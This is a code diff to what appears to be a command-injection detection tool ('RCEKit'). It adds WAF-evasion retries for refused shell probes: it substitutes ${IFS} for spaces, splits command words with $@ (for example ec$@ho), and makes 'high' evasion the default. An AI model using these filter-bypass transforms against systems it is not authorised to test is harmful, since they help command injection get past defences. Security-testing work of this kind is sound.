@@ -45,7 +45,7 @@ def configure_logging() -> None:
 
 # Bump on every change: PATCH for fixes, MINOR for new capabilities, MAJOR for
 # breaking changes to the CLI, output formats, or template schema.
-__version__ = "2.43.0"
+__version__ = "2.44.0"
 
 SAFETY_ORDER = {"safe": 0, "intrusive": 1, "stateful": 2}
 
@@ -151,6 +151,85 @@ SINK_SHAPE_CONTEXTS_BY_ENV = {
     },
 }
 SINK_SHAPE_CONTEXTS = SINK_SHAPE_CONTEXTS_BY_ENV["unix"]
+
+
+# What each evasion rung does to a Unix shell probe, cheapest first. A rung is
+# a trade and it was being made blind: measured shape by shape against an
+# unfiltered target, `low` broke 8 probe shapes that the canonical form
+# executes and improved none of them. Against a filter that blocks whitespace
+# it turned 1 confirmation into 6. So the rung is worth paying for exactly
+# where something was refused, and nowhere else.
+EVASION_RUNGS = ("none", "low", "high")
+
+
+def evade_spaces(body: str, replacement: str) -> str:
+    """Replace spaces *outside single quotes* with ``replacement``.
+
+    Blind replacement was a shipped defect. A probe carrying a quoted program
+    -- ``awk 'BEGIN{print "RK" a+b "RK"}'`` -- had the substitution pushed
+    inside the quotes, where ``${IFS}`` is literal text rather than an
+    expansion, and awk was handed ``BEGIN{print${IFS}"RK"...``. Every one of
+    the shapes the rung lost was this, and the loss was paid even on the
+    targets where the rung is the only thing that gets through.
+
+    Double quotes are left alone for the same reason from the other side:
+    ``${IFS}`` *does* expand inside them, so substituting there would change the
+    string the target computes rather than the spacing around it."""
+    out: List[str] = []
+    quote: Optional[str] = None
+    for char in body:
+        if quote:
+            out.append(char)
+            if char == quote:
+                quote = None
+            continue
+        if char in "'\"":
+            quote = char
+            out.append(char)
+            continue
+        out.append(replacement if char == " " else char)
+    return "".join(out)
+
+
+def evade_body(body: str, rung: str) -> str:
+    """Apply one evasion rung to a Unix shell probe body.
+
+    ``low`` removes whitespace, for a filter that keys on it. ``high`` also
+    splits the command word with an empty expansion -- ``ec$@ho`` -- which is
+    for the other measured class of filter, the one matching command names. The
+    two are separate classes and a rung that only did the first left the second
+    unreachable."""
+    if rung == "high":
+        # Before the space substitution, not after: applied afterwards the
+        # split lands inside `${IFS}` and turns it into `${I$@FS}`, which is
+        # neither an expansion nor a command. The canonical body is where a
+        # command word is still recognisable.
+        body = split_command_word(body)
+    if rung in ("low", "high"):
+        body = evade_spaces(body, "${IFS}")
+    return body
+
+
+def split_command_word(body: str) -> str:
+    """Break the command word with an expansion that vanishes: ``ec$@ho``.
+
+    ``$@`` is empty in a shell with no positional parameters, so the word is
+    ``echo`` to the shell and neither to a filter matching command names --
+    the second class of filter the measurement turned up, and the one a
+    whitespace rung leaves untouched.
+
+    Only the command word, and only outside quotes. A quoted program is the
+    target's data, not a word the shell looks up."""
+    index = 0
+    while index < len(body) and body[index] in ";|& \t\n":
+        index += 1
+    start = index
+    while index < len(body) and body[index].isalpha():
+        index += 1
+    # At least two letters, or there is nothing to split.
+    if index - start < 2:
+        return body
+    return body[:start + 1] + "$@" + body[start + 1:]
 
 
 # Tiers that are a name for *execution*: the thing a `confirmed` already
@@ -466,6 +545,12 @@ class RCEKit:
         # was not the sink.
         self.refused_probes = 0
         self.refused_statuses: Dict[int, int] = {}
+        # Retries a refusal bought, and the ones that got through. Reported,
+        # because extra traffic the operator did not ask for has to be visible
+        # -- and because a rung that never converts anything is one to stop
+        # climbing to.
+        self.escalated_probes = 0
+        self.escalation_wins: Dict[str, int] = {}
         # Requests that actually went out, which is not len(results): an
         # aggregate method fires a whole ladder and reports one row, so a
         # refusal count drawn from rows and a status tally drawn from requests
@@ -2655,6 +2740,45 @@ class RCEKit:
         """Whether this run may send this probe shape. Counts nothing."""
         return SAFETY_ORDER.get(meth.probe_safety(probe), 1) <= self._safety_ceiling(meth)
 
+    def _escalate(self, meth: "DetectionMethod", probe: "Probe", url: str,
+                  method: str, data: Optional[str], headers: Optional[List[str]],
+                  url_location: str, body_location: str, timeout: float,
+                  control_status: Optional[int]
+                  ) -> Optional[Tuple[str, Any, Any, Any, float]]:
+        """Re-send a refused probe, climbing the rungs to the run's ceiling.
+
+        Only a refused probe is retried, which is the whole design. Measured
+        shape by shape against an unfiltered target, applying a rung to every
+        probe broke 8 shapes the canonical form executes and improved none;
+        against a filter that blocks whitespace it turned 1 confirmation into
+        6. The rung is worth its cost exactly where something was refused.
+
+        Returns the first attempt a filter did not refuse, as
+        ``(payload, status, body, channels, elapsed)``, or None when every rung
+        was refused too. Bounded by construction: at most one request per rung.
+
+        The transform is applied to the payload as sent rather than before the
+        context wrapper, which is safe for these two rungs and only these two:
+        neither ``${IFS}`` nor ``$@`` carries a character any context escapes,
+        so the wrapping cannot change underneath them."""
+        ceiling = self.config_evade
+        if ceiling == "none" or probe.carrier == "no-evade":
+            return None
+        for rung in EVASION_RUNGS[1:]:
+            climbed = evade_body(probe.payload, rung)
+            if climbed == probe.payload:
+                continue
+            status, body, chans, elapsed = self._fire_channels(
+                climbed, url, method, data, headers, url_location, body_location,
+                timeout)
+            self.escalated_probes += 1
+            if not payload_refused(status, control_status):
+                self.escalation_wins[rung] = self.escalation_wins.get(rung, 0) + 1
+                return climbed, status, body, chans, elapsed
+            if rung == ceiling:
+                break
+        return None
+
     def _refusal(self, status: Optional[int], control_status: Optional[int],
                  verdict: "Verdict", every: bool = False) -> Optional["Verdict"]:
         """The `blocked` verdict for a refused probe, or None to keep what the
@@ -2757,6 +2881,8 @@ class RCEKit:
         # shape the sink accepts, which is what an operator writing a proof of
         # concept by hand actually wants.
         confirm_depth = (config or {}).get("confirm_depth") or "first"
+        # The ceiling a refused probe may climb to. `none` disables the retry.
+        self.config_evade = (config or {}).get("evade") or "none"
         resolved_body_location = body_location or self._detect_body_location(data, headers)
         selected = [DETECTION_METHODS[name](self, config) for name in methods
                     if name in DETECTION_METHODS]
@@ -2942,6 +3068,23 @@ class RCEKit:
                                       elapsed=elapsed, followup_body=followup_body,
                                       channels=chans, control_channels=control_channels)
                     verdict = meth.confirm(obs, probe)
+                    # A refused probe is retried up the rungs before anything
+                    # is concluded from it: the filter answered, so the sink has
+                    # not had its say yet. Only a refused one -- applying a rung
+                    # to every probe was measured to break 8 shapes and improve
+                    # none.
+                    if payload_refused(status, control_status):
+                        climbed = self._escalate(
+                            meth, probe, url, method, data, headers, url_location,
+                            resolved_body_location, timeout, control_status)
+                        if climbed is not None:
+                            sent, status, body, chans, elapsed = climbed
+                            probe = dataclass_replace(probe, payload=sent)
+                            obs = Observation(
+                                status=status, body=body, control_body=control_body,
+                                elapsed=elapsed, followup_body=followup_body,
+                                channels=chans, control_channels=control_channels)
+                            verdict = meth.confirm(obs, probe)
                     # Decided here rather than in a method's oracle: being
                     # refused is a fact about delivery, not about what any one
                     # method was looking for, so every method inherits the right
@@ -3979,12 +4122,9 @@ class DetectionMethod:
         other payload. Returns a single bare-command payload where no separator
         applies (see :meth:`_needs_separator`).
 
-        With ``--evade low`` and ``evade=True``, apply a single low-touch WAF
-        transform to Unix command probes — substitute ``${IFS}`` for spaces —
-        drawn from the existing shell-bypass vocabulary. It is deliberately
-        minimal, not aggressive/noisy evasion. Callers whose command uses a
-        redirect (``>``) pass ``evade=False``: ``${IFS}`` around ``>`` yields an
-        ambiguous redirect, so those stay canonical."""
+        ``evade=False`` marks a body no rung may be applied to on retry:
+        ``${IFS}`` around a redirect (``>``) yields an ambiguous redirect, so
+        those shapes stay canonical however hard a filter refuses them."""
         if terminate:
             # A trailing '#' comments out whatever the application appends after
             # the injection point. That suffix is not exotic: `ping <input> -w 5`,
@@ -4011,8 +4151,11 @@ class DetectionMethod:
                   for separator in self._separator_candidates(record, sink_env)]
         payloads: List[str] = []
         for body in bodies:
-            if evade and sink_env == "unix" and self.config.get("evade") == "low":
-                body = body.replace(" ", "${IFS}")
+            # No transform here any more. Applying a rung to every probe was
+            # measured shape by shape against an unfiltered target: it broke 8
+            # shapes the canonical form executes and improved none. The rung is
+            # now a retry for a probe a filter actually refused, so its cost is
+            # paid where it buys something and nowhere else.
             if self._context_swallows(record, body):
                 continue
             payloads.append(self._wrap_context(record, body))
@@ -4269,10 +4412,9 @@ class ReflectedMath(DetectionMethod):
 
         Sent at both probe depths: it is one shape, and leaving a whole filter
         class undetectable is not the kind of saving ``--probe-depth quick`` is
-        for. Skipped under ``--evade low``, which already applies the same
-        transform to every probe."""
-        if self.config.get("evade") == "low":
-            return []
+        for. It is a probe shape in its own right rather than a rung, so it is
+        always offered -- the rungs are retries now and do not stand in for
+        it."""
         core = f"echo${{IFS}}{t1}$(({a}+{b})){t2}"
         return [Probe(payload=self._wrap_context(record, body), expected=f"{t1}{total}{t2}",
                       forbidden=f"$(({a}+{b}))", separator=separator)
@@ -4771,11 +4913,8 @@ class ParametricTime(DetectionMethod):
         body = self._sleep_core(delay, sink_env)
         if separator is not None:
             body = f"{separator}{body}"
-        # Same low-touch transform, applied to the whole body (separator
-        # included) exactly as _wrap_variants does it, so the two paths cannot
-        # drift apart.
-        if self.config.get("evade") == "low" and sink_env == "unix":
-            body = body.replace(" ", "${IFS}")
+        # Canonical, like every other probe: a rung is applied on retry, to
+        # the shapes a filter refused.
         return self._wrap_context(record, body)
 
     def next_probes(self, series: "List[Tuple[Probe, Observation]]") -> List[Probe]:
@@ -6971,12 +7110,14 @@ def main(argv: Optional[List[str]] = None) -> int:
     parser.add_argument("--time-base", type=float, default=2.0,
                         help="(time-based detection) base delay N in seconds; the regression fires "
                              "0/N/2N and requires the response time to track it (default: 2.0).")
-    parser.add_argument("--evade", choices=["none", "low"], default="none",
-                        help="WAF posture for --methods shell probes. 'none' (default) sends clean, "
-                             "canonical payloads: fewer variants, clearer confirmation, lowest false "
-                             "positives — assumes authorised, WAF-free access. 'low' applies a single "
-                             "low-touch transform (${IFS} for spaces on Unix); deliberately minimal, not "
-                             "aggressive evasion.")
+    parser.add_argument("--evade", choices=list(EVASION_RUNGS), default="high",
+                        help="(--methods) How far to climb when a filter REFUSES a probe. Every probe "
+                             "is sent canonical first; only a refused one is retried, and only up to "
+                             "this ceiling. 'low' removes whitespace (${IFS}); 'high' (default) also "
+                             "splits the command word (ec$@ho), for a filter matching command names; "
+                             "'none' never retries and sends canonical payloads only. Applying a rung "
+                             "to every probe instead was measured to break 8 probe shapes and improve "
+                             "none, which is why it is a retry rather than a posture.")
     parser.add_argument("--separators", default=None,
                         help="(--methods) Comma-separated command separators the shell probes try to "
                              "break out with, e.g. \"; ,| ,&& \". Default sweeps '; ', '| ', '|| ', "
@@ -7931,6 +8072,16 @@ def main(argv: Optional[List[str]] = None) -> int:
                 for reason, count in sorted(generator.safety_held_reasons.items(),
                                             key=lambda item: (-item[1], item[0])):
                     print(f"[detect]   {count} x {reason}")
+            if generator.escalated_probes:
+                # Extra traffic the operator did not ask for, so it is stated
+                # whatever the run concluded -- including a run that confirmed,
+                # where the retry is the reason it did.
+                won = ", ".join(f"{rung} x{n}" for rung, n
+                                in sorted(generator.escalation_wins.items()))
+                print(f"[detect] {generator.escalated_probes} refused probe(s) were retried "
+                      "up the evasion rungs; "
+                      + (f"{won} got through" if won else "none got through")
+                      + " (--evade none sends canonical payloads only)")
             if generator.settled_probes:
                 # Stated for the same reason the other three are: a ladder that
                 # shrinks quietly is indistinguishable from a target that had
